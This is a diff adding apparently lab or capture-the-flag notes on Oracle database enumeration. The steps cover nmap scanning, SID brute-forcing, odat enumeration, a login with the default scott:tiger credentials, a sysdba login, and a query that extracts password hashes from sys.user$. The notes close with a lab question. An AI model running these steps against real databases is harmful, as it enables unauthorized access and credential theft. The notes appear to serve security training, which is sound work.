@@ -37,3 +37,60 @@ sudo apt-get install python3-scapy -y
 sudo pip3 install colorlog termcolor pycryptodome passlib python-libnmap
 sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
 ```
+
+System Identifier, **SIDs**, are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.
+
+
+**NMAP**
+```
+sudo nmap -p1521 -sV 10.129.204.235 --open
+```
+
+**NMAP - SID Bruteforcing**
+```
+sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+```
+
+
+**Use odat.py to enumerate the oracle db**
+```
+./odat.py all -s 10.129.204.235
+```
+
+Credentials found - scott:tiger
+
+**Use sqlplus to connect to Oracle db**
+```
+sqlplus scott/tiger@10.129.204.235/XE;
+```
+
+If you come across the following error...
+```
+sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
+```
+
+...execute the below:
+```
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+```
+
+**Oracle RDBMS Interaction**
+```
+select table_name from all_tables;
+```
+
+**ORACLE RDBMS Enumeration - Logging in as Sys Admin**
+```
+sqlplus scott/tiger@10.129.204.235/XE as sysdba
+```
+
+**Extracting Password Hashes**
+```
+select name, password from sys.user$;
+```
+
+### Questions
+
+Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
+```
+```
